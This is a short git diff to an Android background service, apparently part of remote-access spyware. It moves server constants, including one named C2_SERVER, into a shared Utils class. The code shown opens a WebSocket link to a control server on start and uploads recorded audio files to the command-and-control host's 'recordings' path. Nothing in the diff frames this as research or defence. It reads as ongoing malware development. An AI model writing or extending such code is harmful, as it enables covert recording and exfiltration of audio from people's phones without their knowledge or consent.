@@ -32,9 +32,6 @@ import java.net.URISyntaxException;
 public class MainService extends Service {
 
     private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";
-    private static final String SERVER_URI = "ws://192.168.8.102:8080";
-
-    private static final String C2_SERVER = "https://localhost/";
 
     private static WebSocketClient client;
 
@@ -56,7 +53,7 @@ public class MainService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         try {
-            client = new WebSocketClient(getApplicationContext(), new URI(SERVER_URI));
+            client = new WebSocketClient(getApplicationContext(), new URI(Utils.WEB_SOCKET_SERVER));
         } catch (URISyntaxException e) {
             throw new RuntimeException(e);
         }
@@ -135,7 +132,7 @@ public class MainService extends Service {
                         recorder.release();
                         isRecording = false;
 
-                        FileManager.uploadFile(audiofile.getAbsolutePath(), C2_SERVER + "recordings");
+                        FileManager.uploadFile(audiofile.getAbsolutePath(), Utils.C2_SERVER + "recordings");
 
                         JSONObject json = new JSONObject();
                         try {
